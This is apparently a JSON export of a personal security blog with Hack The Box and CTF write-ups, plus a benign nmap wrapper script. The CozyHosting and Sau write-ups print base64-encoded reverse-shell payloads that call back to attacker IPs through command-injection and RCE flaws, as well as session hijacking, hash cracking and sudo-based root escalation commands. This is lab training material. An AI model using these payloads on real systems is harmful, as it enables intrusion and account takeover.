[{"content":"","date":null,"permalink":"/posts/","section":"","summary":"","title":""},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"Easy Box # Name CozyHosting OS Linux RELEASE DATE September 2, 2023 DIFFICULTY Easy Port Scan #This is a test\u0026hellip; Output of my naabu scan:\nnaabu -host 10.10.11.230 -p - -rate 5000 -nmap-cli \u0026#34;nmap -sV\u0026#34; 30s   14:09:44 __ ___ ___ ___ _/ / __ __ / _ \\/ _ \\/ _ \\/ _ \\/ // / /_//_/\\_,_/\\_,_/_.__/\\_,_/ projectdiscovery.io [INF] Current naabu version 2.1.8 (latest) [INF] Running CONNECT scan with non root privileges [INF] Found 2 ports on host 10.10.11.230 (10.10.11.230) 10.10.11.230:80 10.10.11.230:22 [INF] Running nmap command: nmap -sV -p 22,80 10.10.11.230 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 14:26 MDT Nmap scan report for cozyhosting.htb (10.10.11.230) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds Looks like port 22 and port 80 are opened.\nPort 80(HTTP) #You need to add cozyhosting.htb to your /etc/hosts to be able to see the site.\nThis is what that web server is serving. Looks like a site for web hosting\nDirectory Enumeration #Running an older tool on it, Dirsearch. I always seem to find interesting things with this tool or what I need usually.\nBy seeing the name actuator I knew that it had to do with the Spring Boot Framework. Following those paths they had some sensitive data that was redacted, that one that stood out was /actuator/sessions as I looked up their documentation, is indeed active user sessions! We can see then on that site or we can retrieve them by making this get request:\ncurl http://cozyhosting.htb/actuator/sessions\\?username=kanderson We got the username from the web service when we go to that same path. I found that using the curl command gave the current active sessions, as they seem to either disconnect for inactivity or it is meant to be switched around. That curl command made sure you got the right one every time.\nI knew this would come handy eventually, since they looked like cookies. I found that during the login functionality of the application, that can replace the Cookies header with \u0026ldquo;kanderson\u0026rdquo; cookies. Make sure you change it on /login and /admin.\nI then turned on Intercept in Repeater and sent over the login request, but this time I used the session cookie from kanderson that we discover under actuator/sessions and boom we were logged in as kanderson and he looks like he\u0026rsquo;s an admin of the site.\nThere was nothing really interesting on this page, other the automatic patching functionality. Which seems to try to connect to other hosts via ssh for patching. It took me a while to figure out, but I was able to find that the \u0026ldquo;Username\u0026rdquo; field is vulnerable to command injection. I came to that conclusion after not sending anything on the username field, it returned this 302 which forwarded to a weird error message.\nThis one was an interesting command injection! I learned about $IFS and how you can leverage it as a white spacecharacter. And we know we need spaces because we received an error.\nAfter adding the $IFS\u0026hellip;\nWe got a successful command injection! We can now try to get a reverse shell.\nExplaining the Reverse Shell #;echo$IFS\u0026#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjMvOTAwMSAwPiYx\u0026#34;|base64$IFS-d$IFS|bash; This is your basic base64 encoded reverse shell: /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP ADDRESS\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1. What happened is that I couldn\u0026rsquo;t use the \u0026ldquo;\u0026amp;\u0026rdquo; in the payload, so I had to encoded. Make suure you start your netcat listener to catch the shell nc -lvnp 9001.\nCommand explained:\nEcho as Base64 with your IP address and listening port Decoded with the command base64 -d Last, we piped to bash, to make sure it executes in bash User Flag #Once we got that reverse shell, I was running as the user app. I couldn\u0026rsquo;t access the /home/josh folder with that user, which I couldn\u0026rsquo;t retrieve the user flag. I tried LinPeas and found some interesting things but nothing to escalate. Found a postgresql database running.\nWhen we first got that reverse shell, we landed on /app which contained a file named cloudhosting-0.0.1.jar. A .jar file is \u0026ldquo;is a compressed archive file format used in the Java programming language to package multiple Java class files and associated resources, such as images, audio files, and configuration files, into a single archive.\u0026rdquo;\nDecompiling JAR file #I noticed we had python3 in that box, so I just setup a simple http server to pull the file.\npython3 -m http.server 8085 And then from my machine, we download\nwget http://cozyhosting.htb:8085/cloudhosting-0.0.1.jar I used this online JAVA decompiler. Nice an easy or you can also use jd-guiwhich can be installed in kali or comes by default.\nWe found credentials for the postgresql database on the file BOOT-INF/classes/application.properties\nUsername:\npostgres Password:\nVg\u0026amp;nvzAQ7XxR We can now try to login to the database. As you remember there were only 2 open ports(80 and 22), so this command has to be run in our rev shell.\npsql -U postgres -W -h localhost -d cozyhosting psql: manages and interacts with PostgreSQL databases. -U: specifies the db username to connect to the database -W: prompts the user for the password before connecting to db -h: specifies the hostname of the PostgreSQL server. In this case, it\u0026rsquo;s connecting to the local machine (localhost). -d : name of the database (-d) to connect to. \\list:displays a list of all existing database names. \\d: Lists the database tables. Looks like we got a bcrypt hash.\nCracking the Hash #Save the hash to a file and then we will be using hashcat and the rockyou worldlist to crack this hash and get our password.\nhashcat -a 0 -m 3200 hashAdmin.txt rockyou.txt hashcat: This is the command-line executable for Hashcat, the password cracking tool. -a 0: This option specifies the attack mode. In this case, -a 0 indicates a \u0026ldquo;straight\u0026rdquo; or \u0026ldquo;brute-force\u0026rdquo; attack mode. In a brute-force attack, Hashcat tries all possible combinations of characters to find the correct password. -m 3200: This option specifies the hash mode. Hashcat supports various hash algorithms, and -m is used to specify the mode for the hash algorithm being targeted. In this case, -m 3200 corresponds to the bcrypt hash algorithm, which is commonly used for storing password hashes securely. Hashcat will attempt to crack bcrypt-hashed passwords. hashAdmin.txt: This is the name of the file that contains the hashed passwords you want to crack. Hashcat will read these hashes from this file and attempt to find the corresponding plaintext passwords. rockyou.txt: This is the name of the wordlist file that Hashcat will use for the brute-force attack. Hashcat will try all the passwords in the \u0026ldquo;rockyou.txt\u0026rdquo; wordlist to see if any of them match the hashed passwords in \u0026ldquo;hashAdmin.txt.\u0026rdquo; I don\u0026rsquo;t have a great GPU, so it took 3 min to crack it.\nPassword:\nmanchesterunited This was the Admin password for the postgresql database. The only other user i need to try it on is josh. So, I did and it logged me in as Josh and that is why we don\u0026rsquo;t reuse passwords\u0026hellip;\nRetrieved the flag on /home/josh/flag.txt\nPrivilege Escalation #Looks like Josh is able to execute commands as root for ssh.\nThis is where GTFobins is my best friend. A quick search for ssh and we can escalate to root with ssh\nsudo ssh -o ProxyCommand=\u0026#39;;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; x ssh: This is the command to initiate an SSH (Secure Shell) session, typically used to connect to remote servers securely. -o ProxyCommand=';sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2': This is the custom SSH option (-o) that specifies a proxy command to establish the SSH connection. The value of the ProxyCommand option is ' ;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2'. ;: The semicolon (;) is used to separate multiple commands in a single line. In this case, it separates the empty command ('') from the subsequent command ('sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2'). sh: This is the command to run a shell, in this case, the Bourne shell (sh). 0\u0026lt;\u0026amp;2: This part of the command is used for input redirection. It redirects file descriptor 0 (standard input) to file descriptor 2 (standard error). 1\u0026gt;\u0026amp;2: This part of the command is used for output redirection. It redirects file descriptor 1 (standard output) to file descriptor 2 (standard error). x: This is the hostname or IP address of the remote server to which you want to establish an SSH connection. Like ChatGPT said: `\u0026ldquo;Unlocking the digital treasure chest, one \u0026lsquo;root\u0026rsquo; at a time!\u0026rdquo;\n","date":"27 September 2023","permalink":"/posts/hackthebox/machines/easy/cozyhosting/","section":"","summary":"Easy Box # Name CozyHosting OS Linux RELEASE DATE September 2, 2023 DIFFICULTY Easy Port Scan #This is a test\u0026hellip; Output of my naabu scan:","title":"Hack The Box Machine - CozyHosting"},{"content":" Name Gunship Category Web RELEASE DATE August 13, 2021 DIFFICULTY Very Easy Start your instance or download the files if you want to look at the code which I recommend.\nCHALLENGE DESCRIPTION #A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world\u0026hellip; all the wooing in the world to make you feel more lonely\u0026hellip; this ride ends here, with a tribute page of the .\u0026gt; British synthwave band called Gunship. 🎶\nPretty small application, looking at the code it takes the input from an your favorite artist. if you input \u0026ldquo;Haigh\u0026rdquo;, \u0026ldquo;Westaway\u0026rdquo;, \u0026ldquo;Gingell\u0026rdquo;. It gives you a different output, but nothing too interesting. This is the code that does all of that:\n","date":"27 September 2023","permalink":"/posts/hackthebox/challenges/web/","section":"","summary":"Name Gunship Category Web RELEASE DATE August 13, 2021 DIFFICULTY Very Easy Start your instance or download the files if you want to look at the code which I recommend.","title":"Hack The Box Machine Challenge - Gunship"},{"content":"","date":null,"permalink":"/categories/hackthebox/","section":"Categories","summary":"","title":"hackthebox"},{"content":"","date":null,"permalink":"/","section":"solidshadw","summary":"","title":"solidshadw"},{"content":"Easy Box # Name Sau OS Linux RELEASE DATE July 8, 2023 DIFFICULTY Easy Port Scan #I actually wanted to test Naabu as my scanner of choice to be able to enumerate the host. I just Naabu to scan all of the ports and Naabu has a feature to then pump the ports to nmap. This was my command and output.\nsolidshadw@solidManjaro  ~/Downloads  $ sudo naabu -p - -host 10.10.11.224 -nmap-cli \u0026#39;nmap -sV -oX nmap-outpu t\u0026#39; __ ___ ___ ___ _/ / __ __ / _ \\/ _ \\/ _ \\/ _ \\/ // / /_//_/\\_,_/\\_,_/_.__/\\_,_/ projectdiscovery.io [INF] Current naabu version 2.1.6 (latest) [INF] Running host discovery scan [INF] Running SYN scan with CAP_NET_RAW privileges [INF] Found 2 ports on host 10.10.11.224 (10.10.11.224) 10.10.11.224:55555 10.10.11.224:22 [INF] Running nmap command: nmap -sV -oX nmap-output -p 22,55555 10.10. 11.224 Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 14:30 MDT Nmap scan report for 10.10.11.224 Host is up (0.069s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 55555/tcp open unknown 1 service unrecognized despite returning data. If you know the service/ version, please submit the following fingerprint at https://nmap.org/cg i-bin/submit.cgi?new-service : SF-Port55555-TCP:V=7.94%I=7%D=7/29%Time=64C576E7%P=x86_64-pc-linux-gnu% r(G SF:etRequest,A2,\u0026#34;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/htm l;\\ SF:x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Sat,\\x2029\\x20Jul\\ x20 SF:2023\\x2020:30:31\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n\u0026lt;a\\x20href=\\ \u0026#34;/w SF:eb\\\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;\\.\\n\\n\u0026#34;)%r(GenericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x2 0Re SF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection :\\x SF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(HTTPOptions,60,\u0026#34;HTTP/1\\.0\\x 202 SF:00\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Sat,\\x2029\\x20Jul\\ x20 SF:2023\\x2020:30:31\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequ est SF:,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pla in; SF:\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reque st\u0026#34; SF:)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 tex SF:t/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ x20 SF:Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n Con SF:tent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r \\n\\ SF:r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1\\.1\\x204 00\\ SF:x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r \\nC SF:onnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSessionReq,6 7,\u0026#34; SF:HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x 20c SF:harset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)% r(K SF:erberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t ext SF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x 20R SF:equest\u0026#34;)%r(FourOhFourRequest,EA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\ r\\n SF:Content-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Opti ons SF::\\x20nosniff\\r\\nDate:\\x20Sat,\\x2029\\x20Jul\\x202023\\x2020:30:58\\x20GM T\\r SF:\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x20 nam SF:e\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250} \\$\\ SF:n\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Ty pe: SF:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\ x20 SF:Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Requ est SF:\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20 clo SF:se\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at htt ps://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.64 seconds Looks like we found 2 ports opened. Port 22 and Port 55555.\nPort 55555 #Looks like this port is running a web interface\nAs I inspect the app. Looks like you can create a webhook like in which it collects and inspects the data sent over.\nWe can send requests to the basket that I created http://10.10.11.224:55555/web/gfr64fy.\nOn the main page, I saw a version number Version: 1.2.1. Which I proceeded to look any potential vulnerabilities and bingo. https://github.com/advisories/GHSA-58g2-vgpg-335q, Looks like it is vulnerable to SSRF. As I continue to dig into this vulnerability, seems that it is exploiting the /api/baskets/{name}. That means that every time we visit that site, that api path gets called and triggered.\nExploring that app a bit more, I found that you can forward URLs.\nI stumbled upon this article that was explaining the SSRF vulnerability and they used this feature of forward URL to exploit the SSRF to find any other webservers not exposed to internet. They found more resources on the localhost that where to not available on our initial scan. So, I tried on port 80 and boom we got another webserver.\nIt looks like it is a Maltrail from the description at the bottom. It also exposes a version v0.53. A quick google search, you can find that version is vulnerable to an Unauthenticated RCE(the best kind) https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/.\nWe will need to add the /login at the end because it looks that is where that RCE happens. So, in the end our config will look something like this:\nPayload to get RevShell #I started testing the RCE by sending a curl command to my host.\nWhich it was successful! So, we know that it is working.\nI tried the basic sh revershell but I couldn\u0026rsquo;t get it to work, not sure why. When digging into this RCE I found this article in which they craft a python reverse shell and echo it in base64 and decode and execute with bash. This was my final payload:\n$ curl \u0026#39;http://10.10.11.224:55555/gfr64fy\u0026#39; \\ --data \u0026#39;username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZ XNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJF QU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjEwIiw4MDg1KSk7b3MuZHVwMihzLmZpbGVubyg pLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG 9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==|base64 -d|bash`\u0026#39; After executing it, it worked!\nPrivilege Escalation Payload #Looks like we are running as the user \u0026ldquo;puma\u0026rdquo;. I ran the command sudo -l to see if he\u0026rsquo;s able to run any commands as sudo without a password.\nA quick google search on privilege escalation when running systemctl status landed me on this page https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/.\nSo, the final payload is divided in two parts. The first is:\nsudo systemctl status trail.service And then you run:\n!sh And that drops you into a shell. We have made it to root.\n","date":"29 July 2023","permalink":"/posts/hackthebox/machines/easy/sau/","section":"","summary":"Easy Box # Name Sau OS Linux RELEASE DATE July 8, 2023 DIFFICULTY Easy Port Scan #I actually wanted to test Naabu as my scanner of choice to be able to enumerate the host.","title":"Hack The Box Machine - Sau"},{"content":"","date":null,"permalink":"/categories/coding/","section":"Categories","summary":"","title":"coding"},{"content":"One of my goals lately has being to learn how to program and what better way than to just find something that you can automate/improve and try to code it out. In this case, I wanted to create a nmap script that would do a quick scan mostly to just find out what ports where open, it is like a ping scan but it is full handshake. After it grabs all the open ports, then it will do a more comprehensive scan with the -sV argument and the default and safe nmap scripts. Here is the code I came up with, with some help of Copilot:\n#!/usr/bin/python3 import subprocess import os import argparse import shutil # Create ArgumentParser object parser = argparse.ArgumentParser(description=\u0026#39;Perform nmap scan.\u0026#39;) group = parser.add_mutually_exclusive_group(required=True) group.add_argument(\u0026#39;-ip\u0026#39;, help=\u0026#39;Single IP address to scan\u0026#39;) group.add_argument(\u0026#39;-f\u0026#39;, \u0026#39;--file\u0026#39;, help=\u0026#39;File with list of hosts to scan, one per line\u0026#39;) parser.add_argument(\u0026#39;-s\u0026#39;, \u0026#39;--save\u0026#39;, help=\u0026#39;Directory to save the output files (optional)\u0026#39;) args = parser.parse_args() # Check if nmap is installed on the host if not shutil.which(\u0026#34;nmap\u0026#34;): print(\u0026#34;nmap not found. Please install nmap and try again.\u0026#34;) exit(1) # Create the directory if it doesn\u0026#39;t exist if args.save: os.makedirs(args.save, exist_ok=True) try: hosts = [] if args.ip: hosts.append(args.ip) elif args.file: with open(args.file, \u0026#39;r\u0026#39;) as file: hosts = file.read().splitlines() for ip in hosts: print(f\u0026#34;Scanning {ip}...\u0026#34;) # Perform quick scan print(\u0026#34;Performing quick scan of ALL ports...\u0026#34;) quickScanResult = subprocess.run([\u0026#34;nmap\u0026#34;, \u0026#34;-Pn\u0026#34;, \u0026#34;-p-\u0026#34;, \u0026#34;--min-rate=1000\u0026#34;, \u0026#34;-T4\u0026#34;, ip], capture_output=True, text=True) # Extract open ports open_ports = [line.split(\u0026#34;/\u0026#34;)[0] for line in quickScanResult.stdout.split(\u0026#34;\\n\u0026#34;) if \u0026#34;open\u0026#34; in line] print(\u0026#34;Open ports:\u0026#34;, \u0026#34;,\u0026#34;.join(open_ports)) # Perform more comprehensive scan print(\u0026#34;\\nPerforming comprehensive scan with Default and safe nmap script...\\n\u0026#34;) comprehensiveScanResults = subprocess.run([\u0026#34;nmap\u0026#34;, \u0026#34;-Pn\u0026#34;, \u0026#34;-sV\u0026#34;, \u0026#34;-p\u0026#34; + \u0026#34;,\u0026#34;.join(open_ports), \u0026#34;--script=default,vuln\u0026#34;, ip], capture_output=True) # Save results of comprehensive scan to file if args.save: underscoreIP = ip.replace(\u0026#34;.\u0026#34;, \u0026#34;_\u0026#34;) output_file = os.path.join(args.save, \u0026#34;nmapComprehensive-\u0026#34; + underscoreIP + \u0026#34;.txt\u0026#34;) with open(output_file, \u0026#34;w\u0026#34;) as file: file.write(comprehensiveScanResults.stdout.decode()) # Print results of comprehensive scan print(comprehensiveScanResults.stdout.decode()) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) ","date":"1 February 2023","permalink":"/posts/coding/python/nmapscript/","section":"","summary":"Nmap python script to help automate","title":"Nmap Python Script"},{"content":"","date":null,"permalink":"/categories/python/","section":"Categories","summary":"","title":"python"},{"content":"","date":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"ctf"},{"content":"This is what a pretty fun CTF. I will be adding my writeups here and will be dividing them by categories. So far this are ones I have uploded:\nWEB # Passman REVERSE # Hunting License ","date":"26 January 2023","permalink":"/posts/ctf/cyberapocalypse23/intro/","section":"","summary":"CyberApocalypse Intro Challenges","title":"Intro"},{"content":"Passman # Name: Passman\nDificulty: Easy {: .prompt-info }\nThis one was a tricky one. I noticed that it was using graphql when I logged in, register registered a user. Not to familiar with this database but I used 2 things to help me understand how the database was setup. I used GraphlQLMap and Hacktricks GraphQL. This is the output of GraphqlMap:\nsolidshadw@pop-os:~/Downloads/web_passman$ graphqlmap -u \u0026#34;http://138.68.162.218:30735/graphql\u0026#34; --proxy http://127.0.0.1:8080 _____ _ ____ _ / ____| | | / __ \\| | | | __ _ __ __ _ _ __ | |__ | | | | | _ __ ___ __ _ _ __ | | |_ | \u0026#39;__/ _` | \u0026#39;_ \\| \u0026#39;_ \\| | | | | | \u0026#39;_ ` _ \\ / _` | \u0026#39;_ \\ | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) | \\_____|_| \\__,_| .__/|_| |_|\\___\\_\\______|_| |_| |_|\\__,_| .__/ | | | | |_| |_| Author: @pentest_swissky Version: 1.1 GraphQLmap \u0026gt; help [+] dump_via_introspection : dump GraphQL schema (fragment+FullType) [+] dump_via_fragment : dump GraphQL schema (IntrospectionQuery) [+] nosqli : exploit a nosql injection inside a GraphQL query [+] postgresqli : exploit a sql injection inside a GraphQL query [+] mysqli : exploit a sql injection inside a GraphQL query [+] mssqli : exploit a sql injection inside a GraphQL query [+] exit : gracefully exit the application GraphQLmap \u0026gt; dump_via_introspection ============= [SCHEMA] =============== e.g: name[Type]: arg (Type!) 00: Query getPhraseList[Phrases]: 01: Phrases id[]: owner[]: type[]: address[]: username[]: password[]: note[]: 04: Mutation RegisterUser[]: email (String!), username (String!), password (String!), LoginUser[]: username (String!), password (String!), UpdatePassword[]: username (String!), password (String!), AddPhrase[]: recType (String!), recAddr (String!), recUser (String!), recPass (String!), recNote (String!), 05: Response message[]: token[]: 07: __Schema 08: __Type 10: __Field 11: __InputValue 12: __EnumValue 13: __Directive GraphQLmap \u0026gt; I\u0026rsquo;m passing it through my proxy, so that it inherits the session/cookies of the user I had created.\nI tried to see if I could register over the admin user but got no luck. I then procedeed to uset the UpdatePassword mutation. This was the query I sent over with Burp.\nI then saw \u0026ldquo;Password updated successfully\u0026rdquo;. I changed the admins password. I then proceed to login and extracted the flag.\nHTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!} ","date":"26 January 2023","permalink":"/posts/ctf/cyberapocalypse23/web/passman/","section":"","summary":"Passman # Name: Passman","title":"Web"},{"content":"","date":null,"permalink":"/projects/","section":"Projects","summary":"","title":"Projects"}]